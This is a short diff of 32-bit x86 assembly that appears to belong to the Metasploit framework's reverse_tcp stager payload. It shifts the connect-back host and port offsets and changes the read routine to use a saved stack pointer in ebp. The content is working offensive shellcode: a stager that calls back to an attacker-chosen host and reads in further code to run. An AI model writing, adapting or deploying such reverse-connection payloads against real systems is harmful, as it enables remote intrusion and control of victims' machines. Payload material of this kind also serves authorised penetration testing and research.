@@ -26,8 +26,8 @@
 ; meta-connection-type=reverse
 ; meta-name=reverse_tcp
 ; meta-basemod=Msf::PayloadComponent::ReverseConnection
-; meta-offset-lhost=0x1a
-; meta-offset-lport=0x21
+; meta-offset-lhost=0x1c
+; meta-offset-lport=0x23
 ;;
 BITS   32
 GLOBAL _start
@@ -35,6 +35,7 @@ GLOBAL _start
 _start:
 
 initialization:
+	mov  ebp, esp
 	push 0xc3000700
 	mov  eax, 0x9a
 	cdq
@@ -67,7 +68,7 @@ read:
 	mov  al, 0x3
 	mov  dh, 0xc
 	push edx
-	push esp
+	push ebp
 	push edi
 	call esi
 	pop  edi
